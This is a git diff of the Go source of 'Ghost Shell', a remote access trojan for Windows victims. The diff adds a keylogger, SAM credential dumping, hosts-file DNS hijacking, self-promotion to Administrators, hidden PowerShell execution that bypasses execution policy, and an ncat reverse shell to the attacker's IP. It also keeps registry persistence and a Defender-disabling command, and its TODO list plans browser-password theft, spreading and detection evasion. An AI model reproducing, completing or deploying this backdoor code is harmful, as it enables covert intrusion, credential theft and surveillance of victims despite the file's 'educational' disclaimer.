@@ -1,14 +1,14 @@
 /*
 
 ░▒▓███████▓▒░░▒▓███████▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓████████▓▒░
-░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
-░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
+░▒▓█▓▒ ░▒▓█▓▒░     ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
+░▒▓█▓▒ ░▒▓█▓▒░     ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
 ░▒▓███████▓▒░░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓█▓▒ ░▒▓█▓▒░
-░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
-░▒▓█▓▒ ░▒▓█▓▒░      ░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
+░▒▓█▓▒ ░▒▓█▓▒░     ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
+░▒▓█▓▒ ░▒▓█▓▒░     ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓█▓▒ ░▒▓█▓▒░
 ░▒▓█▓▒ ░▒▓█▓▒░▒▓███████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒ ░▒▓█▓▒░▒▓████████▓▒░
-Nonpartisan and secular, yet always standing with the marginalized
-and oppressed. ---------------------------> retrochorizo@proton.me
+  Nonpartisan                 and                      secular
+---------------------retrochorizo@proton.me----------------------
 
 */
 
@@ -28,6 +28,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/MarinX/keylogger"
 	"github.com/micmonay/keybd_event"
 )
 
@@ -98,9 +99,10 @@ func StringToVK(keyList []string) []int {
 
 var (
 	// attackerIP
-	attackerIP string = "192.168.0.22"
-	serverip   string = "000.000.0.00"
-	victimPort int    = 5555
+	attackerIP  string = "192.168.0.22"
+	serverip    string = "000.000.0.00"
+	victimPort  int    = 5555
+	persistance bool   = false
 )
 
 func handleConnection(conn net.Conn) {
@@ -108,9 +110,9 @@ func handleConnection(conn net.Conn) {
 
 	reader := bufio.NewReader(conn)
 	fmt.Fprintln(conn, "")
-	fmt.Fprintln(conn, "+---------------------------------------------+")
-	fmt.Fprintln(conn, "\033[1;31mR3TR0 GH0ST_SHELL_project V1.7\033[0m")
-	fmt.Fprintln(conn, "+---------------------------------------------+")
+	fmt.Fprintln(conn, " +---------------------------------------------+")
+	fmt.Fprintln(conn, " \033[1;31mR3TR0 GH0ST_SHELL_project V1.7\033[0m")
+	fmt.Fprintln(conn, " +---------------------------------------------+")
 	fmt.Fprintln(conn, " ▄███████▄     ▄████████    ▄████████  ▄██████▄  ")
 	fmt.Fprintln(conn, "██▀     ▄██   ███    ███   ███    ███ ███    ███ ")
 	fmt.Fprintln(conn, "      ▄███▀   ███    █▀    ███    ███ ███    ███ ")
@@ -121,11 +123,20 @@ func handleConnection(conn net.Conn) {
 	fmt.Fprintln(conn, " ▀████████▀   ██████████   ███    ███  ▀██████▀  ")
 	fmt.Fprintln(conn, "                           ██▀    █▀             ")
 	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
-	fmt.Fprintln(conn, "  |T|h|e| |h|a|c|k|e|r| |b|e|s|t| |f|r|i|e|n|d|  ")
+	fmt.Fprintln(conn, "  |T|h|e| |H|a|c|k|e|r| |B|e|s|t| |F|r|i|e|n|d|  ")
 	fmt.Fprintln(conn, "  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+  ")
 	fmt.Fprintln(conn, "")
+	if persistance {
+		fmt.Fprintln(conn, "\033[1;31m'persistance = '\033[0m true")
+	}
+	if !persistance {
+		fmt.Fprintln(conn, "\033[1;31m'persistance = '\033[0m false")
+	}
+	fmt.Fprintln(conn, "\033[1;31mRunning as: \033[0m"+os.Getenv("USERNAME"))
+
 	fmt.Fprintln(conn, "Type \033[1;31m'help'\033[0m for available commands")
-	fmt.Fprintln(conn, "___________________________________________________")
+	fmt.Fprintln(conn, "Type \033[1;31m'info'\033[0m for more information about this tool")
+	fmt.Fprintln(conn, "")
 	fmt.Fprintln(conn, "")
 
 	for {
@@ -196,7 +207,7 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintf(conn, "\n")
 			}
 
-		case strings.HasPrefix(message, "ps"):
+		case strings.HasPrefix(message, "ps1"):
 			// Extraire le chemin du fichier PS1 de la commande
 			parts := strings.Fields(message)
 			if len(parts) < 2 {
@@ -206,7 +217,7 @@ func handleConnection(conn net.Conn) {
 			filePath := parts[1]
 
 			// Exécuter le fichier PowerShell
-			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", filePath)
+			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", filePath, "-WindowStyle", "Hidden")
 
 			// Capturer la sortie de la commande et les erreurs
 			output, err := cmd.CombinedOutput()
@@ -238,34 +249,26 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintf(conn, "\n")
 			}
 
-		case strings.HasPrefix(message, "get_file"):
-			// Extraire le nom du fichier à récupérer de la commande
+		case strings.HasPrefix(message, "upload"):
+			// Extrait le nom du fichier à télécharger de la commande
 			parts := strings.Fields(message)
 			if len(parts) < 2 {
-				fmt.Fprintln(conn, "Usage: get_file <filename>")
+				fmt.Fprintln(conn, "Usage: upload <filename>")
 				fmt.Fprintf(conn, "\n")
 			}
 			filename := parts[1]
 
-			// Lire le contenu du fichier depuis l'ordinateur de la victime
-			content, err := ioutil.ReadFile(filename)
+			// Lire le contenu du fichier à télécharger
+			data, err := ioutil.ReadFile(filename)
 			if err != nil {
 				fmt.Fprintf(conn, "Error reading file: %s\n", err)
 				fmt.Fprintf(conn, "\n")
 			}
 
-			// Définir le chemin du fichier sur l'ordinateur de l'attaquant
-			attackerFilePath := filename
-
-			// Écrire le contenu du fichier dans un nouveau fichier sur l'ordinateur de l'attaquant
-			err = ioutil.WriteFile(attackerFilePath, content, 0644)
-			if err != nil {
-				fmt.Fprintf(conn, "Error writing file: %s\n", err)
-				fmt.Fprintf(conn, "\n")
-			} else {
-				fmt.Fprintf(conn, "File %s successfully retrieved and saved as %s\n", filename, attackerFilePath)
-				fmt.Fprintf(conn, "\n")
-			}
+			// Envoyer le contenu du fichier au client a travers une connexion TCP
+			conn.Write(data)
+			fmt.Fprintln(conn, "File uploaded successfully")
+			fmt.Fprintf(conn, "\n")
 
 		case message == "ls":
 			// Exécute la commande "dir" pour lister les fichiers dans le répertoire courant
@@ -380,7 +383,7 @@ func handleConnection(conn net.Conn) {
 			ip := parts[2]
 
 			// Créer la commande pour ajouter une entrée DNS
-			cmd := exec.Command("cmd", "/c", "netsh", "interface", "ipv4", "add", "dnsserver", "name=", name, "address=", ip, "index=1")
+			cmd := exec.Command("cmd", "/c", "echo", ip, name, ">>", "C:\\Windows\\System32\\drivers\\etc\\hosts")
 
 			// Exécuter la commande
 			err := cmd.Run()
@@ -389,6 +392,18 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintf(conn, "\n")
 			} else {
 				fmt.Fprintln(conn, "DNS server set successfully")
+				fmt.Fprintf(conn, "\n")
+			}
+
+			time.Sleep(100 * time.Millisecond)
+
+			cmd = exec.Command("cmd", "/c", "ipconfig", "/flushdns")
+			err = cmd.Run()
+			if err != nil {
+				fmt.Fprintf(conn, "Error flushing DNS cache: %s\n", err)
+				fmt.Fprintf(conn, "\n")
+			} else {
+				fmt.Fprintln(conn, "DNS cache flushed successfully")
 				fmt.Fprintf(conn, "\n")
 			}
 
@@ -449,41 +464,39 @@ func handleConnection(conn net.Conn) {
 				}
 
 				// Envoyer les frappes de clavier en séquence
-				// Envoyer la touche WIN
 				kb.HasSuper(true)
 				kb.Launching()
 				kb.HasSuper(false)
 
 				time.Sleep(100 * time.Millisecond)
 
-				// Envoyer "def"
 				kb.SetKeys(keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F)
 				kb.Launching()
-				time.Sleep(310 * time.Millisecond)
+				time.Sleep(300 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_ENTER)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(300 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_ENTER)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(300 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(100 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(100 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(100 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_TAB)
 				kb.Launching()
-				time.Sleep(200 * time.Millisecond)
+				time.Sleep(100 * time.Millisecond)
 
 				kb.SetKeys(keybd_event.VK_ENTER)
 				kb.Launching()
@@ -502,15 +515,12 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintf(conn, "\n")
 			}(conn)
 
-		case message == "migrate":
-			// essaye de migrer le procecuss dans un autre c'est mega chaud ...
-
 		case message == "shell":
-			// eveille beaucoup trop les soupcons
-			/*
-				exec.Command("ncat", attackerIP, "4444", "-e", "powershell")
-				fmt.Fprintln(conn, "shell opened on windows")
-			*/
+			what := "ncat"
+			who := "powershell"
+			where := "4444"
+			exec.Command(what, attackerIP, where, "-e", who)
+			fmt.Fprintln(conn, "shell opened on windows")
 
 		case strings.HasPrefix(message, "set_attacker"):
 			// Diviser la commande en parties pour obtenir la nouvelle adresse IP de l'attaquant
@@ -540,28 +550,41 @@ func handleConnection(conn net.Conn) {
 			conn.Close()
 
 		case message == "persist":
-			// Nom du programme à ajouter au démarrage
-			filename := "gs.exe"
-
-			// Chemin complet de l'exécutable
-			path := "C:\\Program Files\\Windows Mail\\" + filename
-
-			// Copier le fichier exécutable dans le dossier Program Files
-			if err := os.Rename(filename, path); err != nil {
-				fmt.Fprintln(conn, "Error moving file:", err)
-				fmt.Fprintf(conn, "\n")
-			}
-
-			// Créer la commande pour ajouter une clé de registre pour exécuter le backdoor au démarrage
-			cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "BackdoorName", "/t", "REG_SZ", "/d", path, "/f")
-
-			// Exécuter la commande
-			if err := cmd.Run(); err != nil {
-				fmt.Fprintln(conn, "Error adding registry key for persistence:", err)
+			if persistance {
+				fmt.Fprintln(conn, "Persistence already set")
 				fmt.Fprintf(conn, "\n")
 			} else {
-				fmt.Fprintln(conn, "Registry key added for persistence successfully")
-				fmt.Fprintf(conn, "\n")
+				// Nom du programme à ajouter au démarrage
+				filename := "gs.exe"
+
+				// crée un nouveau dossier C:\\Program Files\Windows Mail\backup pour stocker le fichier exécutable
+				err := os.Mkdir("C:\\Program Files\\Windows Mail\\backup", 0755)
+				if err != nil {
+					fmt.Fprintf(conn, "Error creating backup folder: %s\n", err)
+					fmt.Fprintf(conn, "\n")
+				}
+
+				// Chemin complet de l'exécutable
+				path := "C:\\Program Files\\Windows Mail\\backup\\" + filename
+
+				// Copier le fichier exécutable dans le dossier Program Files
+				if err := os.Rename(filename, path); err != nil {
+					fmt.Fprintln(conn, "Error moving file:", err)
+					fmt.Fprintf(conn, "\n")
+				}
+
+				// Créer la commande pour ajouter une clé de registre pour exécuter le backdoor au démarrage
+				cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "BackdoorName", "/t", "REG_SZ", "/d", path, "/f")
+
+				// Exécuter la commande
+				if err := cmd.Run(); err != nil {
+					fmt.Fprintln(conn, "Error adding registry key for persistence:", err)
+					fmt.Fprintf(conn, "\n")
+				} else {
+					fmt.Fprintln(conn, "Registry key added for persistence successfully")
+					persistance = true
+					fmt.Fprintf(conn, "\n")
+				}
 			}
 
 		case message == "calcexpress":
@@ -602,7 +625,8 @@ func handleConnection(conn net.Conn) {
 			}
 
 			// Exécution du script PowerShell dans un processus séparé
-			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
+			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath, "-WindowStyle", "Hidden")
+
 			err = cmd.Start()
 			if err != nil {
 				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
@@ -643,7 +667,7 @@ func handleConnection(conn net.Conn) {
 			}
 
 			// Exécution du script PowerShell dans un processus séparé
-			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath)
+			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath, "-WindowStyle", "Hidden")
 			err = cmd.Start()
 			if err != nil {
 				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
@@ -698,46 +722,46 @@ func handleConnection(conn net.Conn) {
 			}
 			msg := parts[1]
 
-			// Créer le script VBScript pour afficher le message
-			script := fmt.Sprintf(`
-				Set objArgs = WScript.Arguments
-				messageText = objArgs(0)
-				MsgBox messageText
+			// wpf message box
+			// Créer le script PowerShell pour afficher le message
+			messageScript := fmt.Sprintf(`
+			Add-Type -AssemblyName PresentationFramework
+			[System.Windows.MessageBox]::Show('%s', 'Message', 'OK', 'Information')
 			`, msg)
 
-			// Écrire le script VBScript dans un fichier temporaire
-			scriptFile := "message.vbs"
-			err := ioutil.WriteFile(scriptFile, []byte(script), 0644)
-			if err != nil {
-				fmt.Fprintf(conn, "Error writing VBScript file: %s\n", err)
-				fmt.Fprintf(conn, "\n")
-				return
-			}
-			defer os.Remove(scriptFile) // Supprimer le fichier temporaire après utilisation
+			// Chemin du fichier pour enregistrer le script PowerShell
+			scriptFilePath := "message.ps1"
 
-			// Exécuter le script VBScript pour afficher le message
-			cmd := exec.Command("cscript", scriptFile)
-			err = cmd.Run()
+			// Écriture du script PowerShell dans un fichier
+			err := ioutil.WriteFile(scriptFilePath, []byte(messageScript), 0644)
 			if err != nil {
-				fmt.Fprintf(conn, "Error displaying message: %s\n", err)
+				fmt.Fprintf(conn, "Error writing PowerShell script to file: %s\n", err)
+				fmt.Fprintf(conn, "\n")
+			}
+
+			// Exécution du script PowerShell dans un processus séparé
+			cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-File", scriptFilePath, "-WindowStyle", "Hidden")
+			err = cmd.Start()
+			if err != nil {
+				fmt.Fprintf(conn, "Error executing PowerShell script: %s\n", err)
 				fmt.Fprintf(conn, "\n")
 			} else {
-				fmt.Fprintln(conn, "Message displayed successfully")
+				fmt.Fprintln(conn, "PowerShell script executed successfully for message")
 				fmt.Fprintf(conn, "\n")
 			}
+			defer os.Remove(scriptFilePath) // Supprimer le fichier temporaire après utilisation
 
 		case message == "escalate":
-			// Exécuter la commande "runas" pour essayer d'obtenir des privilèges administratifs
-			cmd := exec.Command("runas", "/user:Administrator", "cmd", "/c", "echo Elevated Command Prompt")
+			// Exécute la commande "net user" pour ajouter l'utilisateur à un groupe d'administrateurs
+			cmd := exec.Command("cmd", "/c", "net", "localgroup", "Administrators", "r3tr0", "/add")
 
-			// Exécuter la commande
+			// Exécute la commande
 			err := cmd.Run()
 			if err != nil {
-				fmt.Fprintf(conn, "Error executing escalate command: %s\n", err)
+				fmt.Fprintf(conn, "Error escalating privileges: %s\n", err)
 				fmt.Fprintf(conn, "\n")
-
 			} else {
-				fmt.Fprintln(conn, "Escalation to administrator privileges attempted successfully")
+				fmt.Fprintln(conn, "Privileges escalated successfully")
 				fmt.Fprintf(conn, "\n")
 			}
 
@@ -772,18 +796,17 @@ func handleConnection(conn net.Conn) {
 			}
 
 		case message == "info":
-
-			fmt.Fprintln(conn, "Ghost Shell is a remote administration tool written in Go. It provides various commands to interact with the target machine,")
-			fmt.Fprintln(conn, "such as checking the server status, getting IP addresses, executing shell commands, listing processes, killing processes, ")
-			fmt.Fprintln(conn, "escalating privileges, and more. It also includes features like keylogging, opening a reverse shell, persisting the backdoor,")
+			fmt.Fprintln(conn, "\033[1;31mGhost Shell\033[0m is a remote administration tool written in Go. It provides various commands to interact with the target machine")
+			fmt.Fprintln(conn, "such as checking the server status, getting IP addresses, executing shell commands, listing processes, killing processes ")
+			fmt.Fprintln(conn, "escalating privileges, and more. It also includes features like keylogging, opening a reverse shell, persisting the backdoor")
 			fmt.Fprintln(conn, "and controlling the mouse and keyboard.")
-			fmt.Fprintln(conn, "Disclaimer: This tool is for educational purposes only. The author is not responsible for any misuse of this tool.")
+			fmt.Fprintln(conn, "\033[1;31mDisclaimer:\033[0m This tool is for educational purposes only. The author is not responsible for any misuse of this tool.")
 			fmt.Fprintln(conn, "please use it with caution and only on authorized systems.")
 			fmt.Fprintf(conn, "\n")
-			fmt.Fprintln(conn, "ps: This tool is still in development and may contain bugs or incomplete features.")
+			fmt.Fprintln(conn, "\033[1;31mps:\033[0m This tool is still in development and may contain bugs or incomplete features.")
 			fmt.Fprintf(conn, "\n")
-			fmt.Fprintln(conn, "\033[1;31mAuthor: R3TR0\033[0m Nonpartisan and secular")
-			fmt.Fprintln(conn, "\033[1;31mVersion: 1.7\033[0m")
+			fmt.Fprintln(conn, "\033[1;31mAuthor:\033[0m R3TR0")
+			fmt.Fprintln(conn, "\033[1;31mVersion:\033[0m 1.7")
 
 		case message == "update":
 			// Exécute la commande "curl" pour mettre à jour le backdoor depuis le serveur raspberry pi
@@ -809,13 +832,114 @@ func handleConnection(conn net.Conn) {
 				fmt.Fprintf(conn, "\n")
 			}
 
+		/******************* PAS ENCORE CODÉ ************************************************************/
+		/************************************************************************************************/
 		case message == "get_screen":
+			// Capture l'écran de la machine cible
 
 		case message == "get_cam":
+			// Capture la webcam de la machine cible
 
 		case message == "get_mic":
+			// Capture le microphone de la machine cible
+
+		case message == "migrate":
+			// essaye de migrer le procecuss dans un autre c'est mega chaud ...
+
+		case message == "get_clipboard":
+			// Récupère le contenu du presse-papiers de la machine cible
+
+		case message == "wbpass":
+			// C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data		// Chrome
+			// C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Web Data		// Edge
+			// C:\Users\%USERNAME%\AppData\Local\Opera Software\Opera Stable\Login Data			// Opera
+		/************************************************************************************************/
+		/************************************************************************************************/
 
 		case message == "keylogger":
+			keyboard := keylogger.FindKeyboardDevice()
+
+			fmt.Fprintln(conn, "Keylogger started... (Press 'q' to stop)")
+			k, err := keylogger.New(keyboard)
+			if err != nil {
+				fmt.Fprintln(conn, "Error creating keylogger:", err)
+				fmt.Fprintf(conn, "\n")
+			}
+
+			for {
+				event := <-k.Read()
+				fmt.Fprintf(conn, event.KeyString())
+				if event.KeyString() == "q" {
+					break
+				}
+			}
+			fmt.Fprintln(conn, "Keylogger stopped")
+			fmt.Fprintf(conn, "\n")
+
+		case message == "samdb":
+			// Exécute la commande "reg save" pour sauvegarder le fichier SAM
+			cmd := exec.Command("cmd", "/c", "reg", "save", "HKLM\\SAM", "samdb")
+
+			// Exécute la commande
+			err := cmd.Run()
+			if err != nil {
+				fmt.Fprintf(conn, "Error saving SAM database: %s\n", err)
+				fmt.Fprintf(conn, "\n")
+			} else {
+				fmt.Fprintln(conn, "SAM database saved successfully")
+				fmt.Fprintf(conn, "\n")
+			}
+
+		case message == "hacked":
+			asciiArt := `
+			
+
+
+                                              ████                                      
+                                            ██▓▓▓▓██                                    
+                                          ██▓▓▓▓██                                      
+                                          ██▓▓██                                        
+                                ████████  ██▓▓██  ████████                              
+                            ████░░░░░░░░████▓▓████░░░░░░░░████                          
+                        ████░░░░░░░░░░██░░░░██░░░░██░░░░░░░░░░████                      
+                      ██░░░░██░░░░░░██░░░░░░░░░░░░░░██░░░░░░██░░░░██                    
+                    ██░░░░██░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░██░░░░██                  
+                    ██░░██░░░░░░░░██░░░░░░░░██░░░░░░░░██░░░░░░░░██░░██                  
+                  ██░░██░░░░░░░░██████░░░░░░██░░░░░░██████░░░░░░░░██░░██                
+                  ██░░██░░░░░░██████████░░░░░░░░░░██████████░░░░░░██░░██                
+                  ██░░██░░░░░░██████████░░░░░░░░░░██████████░░░░░░██░░██                
+                  ██░░██░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░██░░██                
+                  ██░░██░░░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░░░░░░░██░░██                
+                  ██░░██░░░░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░░██░░██                
+                  ██░░░░░░░░░░░░████░░░░░░░░░░░░░░░░░░████░░░░░░░░░░░░██                
+                  ██░░░░░░░░░░░░░░████░░░░░░░░░░░░░░████░░░░░░░░░░░░░░██                
+                    ██░░██░░░░░░░░░░██████████████████░░░░░░░░░░██░░██                  
+                    ██░░░░██░░░░░░░░░░░░██████████░░░░░░░░░░░░██░░░░██                  
+                      ██░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░██                    
+                        ████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████                      
+                            ████░░░░░░░░░░░░██░░░░░░░░░░░░████                          
+                                ████████████  ████████████  
+								YOU   HAVE   BEEN   HACKED
+
+
+
+			`
+			err1 := ioutil.WriteFile("hacked.txt", []byte(asciiArt), 0644)
+			if err1 != nil {
+				fmt.Fprintf(conn, "Error writing file: %s\n", err)
+				fmt.Fprintf(conn, "\n")
+			}
+
+			// Exécuter le fichier txt
+			cmd := exec.Command("cmd", "/c", "hacked.txt")
+			err := cmd.Run()
+			if err != nil {
+				fmt.Fprintf(conn, "Error executing command: %s\n", err)
+				fmt.Fprintf(conn, "\n")
+			} else {
+				fmt.Fprintln(conn, "printed successfully")
+				fmt.Fprintf(conn, "\n")
+			}
 
 		case message == "help":
 			fmt.Fprintln(conn, "________________________________________")
@@ -835,14 +959,15 @@ func handleConnection(conn net.Conn) {
 			fmt.Fprintln(conn, "\033[1;31mkill\033[0m <pid>: Kill a process")
 			fmt.Fprintln(conn, "\033[1;31mmigrate:\033[0m Try to migrate the process to another process (Not implemented yet)")
 			fmt.Fprintln(conn, "\033[1;31mpersist:\033[0m Make the backdoor run at startup")
-			fmt.Fprintln(conn, "\033[1;31mescalate:\033[0m Try to escalate the privileges to admin")
+			fmt.Fprintln(conn, "\033[1;31mescalate:\033[0m Try to escalate the privileges to admin( do stuff on screen for 4 seconds)")
 			fmt.Fprintln(conn, "________________________________________")
-			fmt.Fprintln(conn, "\033[1;31mset_dns\033[0m <name> <ip adress>: Try to change the dns (Dosent work)")
+			fmt.Fprintln(conn, "\033[1;31mset_dns\033[0m <name> <ip adress>: Try to change the dns")
 			fmt.Fprintln(conn, "\033[1;31mwindefucker:\033[0m Stop windows defender realtime protection")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mcalcexpress:\033[0m Run calcexpress (Open a clacultater every time the mouse move )")
 			fmt.Fprintln(conn, "\033[1;31mfolderexpress:\033[0m Run folderexpress (Create a new folder on desktop every 200ms)")
 			fmt.Fprintln(conn, "\033[1;31mmouselocker:\033[0m Run mouselocker (Lock the mouse on 0x 0y)")
+			fmt.Fprintln(conn, "\033[1;31mhacked:\033[0m Print a cool 'you have been hacked' message (Not usefull at all but cool)")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mshutdown:\033[0m Shutdown the victim pc")
 			fmt.Fprintln(conn, "\033[1;31mmessage\033[0m <text>: Send a message to the victim")
@@ -851,16 +976,19 @@ func handleConnection(conn net.Conn) {
 			fmt.Fprintln(conn, "\033[1;31mget_screen:\033[0m Get screen stream (Not implemented yet)")
 			fmt.Fprintln(conn, "\033[1;31mget_cam:\033[0m Get webcam stream (Not implemented yet)")
 			fmt.Fprintln(conn, "\033[1;31mget_mic:\033[0m Get microphone stream (Not implemented yet)")
-			fmt.Fprintln(conn, "\033[1;31keylogger:\033[0m Get keyboard stream (Not implemented yet)")
+			fmt.Fprintln(conn, "\033[1;31mget_clipboard:\033[0m copy the clipboard (Not implemented yet)")
+			fmt.Fprintln(conn, "\033[1;31keylogger:\033[0m Get keyboard stream")
+			fmt.Fprintln(conn, "\033[1;31msamdb:\033[0m try to get the samdb file (need to be admin)")
+			fmt.Fprintln(conn, "\033[1;31mwbpass:\033[0m try to get every web browser password")
 			fmt.Fprintln(conn, "________________________________________")
 			fmt.Fprintln(conn, "\033[1;31mls:\033[0m List files in the current directory")
 			fmt.Fprintln(conn, "\033[1;31mls_hidden:\033[0m List hidden files")
 			fmt.Fprintln(conn, "\033[1;31mpwd:\033[0m Print the current working directory")
 			fmt.Fprintln(conn, "\033[1;31mcd:\033[0m Change directory")
 			fmt.Fprintln(conn, "\033[1;31mrun\033[0m <programname>: Execute a program")
-			fmt.Fprintln(conn, "\033[1;31mps\033[0m <programname>: Execute a program PS1 (powershell)")
+			fmt.Fprintln(conn, "\033[1;31mps1\033[0m <programname>: Execute a program PS1 (powershell)")
 			fmt.Fprintln(conn, "\033[1;31mdownload\033[0m <filename>: Download a file")
-			fmt.Fprintln(conn, "\033[1;31mget_file\033[0m <filename>: Upload the file to the attacker server (Dosent work yet)")
+			fmt.Fprintln(conn, "\033[1;31mupload\033[0m <filename>: Upload the file to the attacker server (Dosent work yet)")
 			fmt.Fprintln(conn, "\033[1;31mdelete\033[0m <filename>: Delete a file")
 			fmt.Fprintln(conn, "\033[1;31merase:\033[0m Delete all files in the current directory")
 			fmt.Fprintln(conn, "________________________________________")
@@ -906,16 +1034,21 @@ func main() {
 /*
 
 TODO :
-		- terminer windefucker (il faut trouver le temps optimal pour que ca marche)
-		- reparer le script mouselocker (fait mais pas testé)
-		- set_dns ne fonctionne pas encore
-		- message ne fonctionne pas encore non plus (reparé mais pas encore testé)
+		- message ne fonctionne pas encore non plus (genere une erreur)
+		- tester keylogger
+		- tester upload
+		- tester windefucker
+		- tester escalate
+		- tester hacked
 
 		- coder la fonctionnalité get_screen
 		- coder la fonctionnalité get_cam
 		- coder la fonctionnalité get_mic
-		- coder la fonctionnalité keylogger
-		- coder info (fait)
+		- coder la fonctionnalité get_clipboard
+		- coder la fonctionnalité keylogger (ne fonctionne pas)
+		- coder migrate
+		- coder une fonctionnalité 'spread' qui crée plusieurs copies du programme dans plusieurs endroits caché de sorte a ce que meme si l'une est supprimé
+		les autres restes
 
 		- ajouter une fonctionnalité qui blackscreen et mute pendant 5 seconde le temps d'executer windefucker (je ne sais pas si c'est possible)
 
@@ -928,12 +1061,9 @@ TODO :
 		-ajouter une fonctionnalité pour communiquer en tcp avec la victime
 		-ajouter une fonctionnalité pour communiquer au micro avec la victime ???
 
-		- BUG : ps sans rien arrete le serveur
 		- shell : se fait detecter par windows defender !!! (peut etre utiliser les touches du clavier pour demarer ncat ???)
 
 		- repenser keyboard pour integrer les touches alt, ctrl et win, par exeple win/r applique r avec la touche win pressé
-
-		- shutdown doit forcer l'arret (fait mais pas testé)
 
 		- faire envoyer une alerte au demarage a un serveur de sorte a connaitre l'adresse ip de la victime a chaque fois
 		qu'elle demarre son ordi et a chaque changement de l'adresse ip
@@ -951,8 +1081,8 @@ TODO :
 Dependances :
 		1)go mod init ghost_shell
 		2)go mod tidy
-		3)go get -u github.com/gerifield/keybd_event
-		5)go get github.com/gerifield/keybd_event
+		3)go get github.com/gerifield/keybd_event
+		4)go get github.com/MarinX/keylogger
 
 Compilation :
 		GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui -o gs.exe ghost_shell.go
